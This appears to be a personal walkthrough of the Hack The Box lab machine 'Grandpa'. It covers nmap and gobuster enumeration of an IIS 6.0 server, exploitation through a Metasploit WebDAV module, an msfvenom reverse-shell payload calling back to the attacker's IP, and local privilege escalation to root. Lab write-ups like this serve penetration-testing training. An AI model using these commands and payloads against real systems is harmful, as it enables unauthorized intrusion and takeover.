# Grandpa

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn $IP
    
    Starting Nmap 7.93 ( [https://nmap.org](https://nmap.org/) ) at 2023-08-07 04:25 EDT
    Nmap scan report for 10.129.95.234
    Host is up (0.041s latency).
    Not shown: 999 filtered tcp ports (no-response)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 6.0
    | http-methods:
    |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
    |*http-title: Under Construction
    | http-webdav-scan:
    |   Server Type: Microsoft-IIS/6.0
    |   Server Date: Mon, 07 Aug 2023 08:25:40 GMT
    |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
    |   WebDAV type: Unknown
    |*  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
    |_http-server-header: Microsoft-IIS/6.0
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
    
- sudo gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt
    
    /_private             (Status: 301) [Size: 155] [--> http://10.129.95.234/_private/]
    /_vti_log             (Status: 301) [Size: 157] [--> http://10.129.95.234/_vti_log/]
    /_vti_bin             (Status: 301) [Size: 157] [--> http://10.129.95.234/_vti_bin/]
    /_vti_bin/shtml.dll   (Status: 200) [Size: 96]
    /_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]
    /_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]
    /aspnet_client        (Status: 301) [Size: 160] [--> http://10.129.95.234/aspnet_client/]
    /images               (Status: 301) [Size: 151] [--> http://10.129.95.234/images/]
    /Images               (Status: 301) [Size: 151] [--> http://10.129.95.234/Images/]
    

Found exploit for IIS 6.0

## Exploitation

msfconsole

windows/iis/iis_webdav_scstoragepathfromurl

received shell

## Privilege Escalation

Need to stabilize shell to run suggester

dir /a:h to show hidden files

Can create files in NetworkService home

msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.16.173 LPORT=1127 -f exe -o shell.exe

upload shell.exe "C:\Documents and Settings\NetworkService\shell.exe”

set up listener on msfconsole with multi/handler

ran the shell.exe and received a better shell allowing me to run suggester

windows/local/ms14_058_track_popup_menu

rooted

## Post-exploitation

None
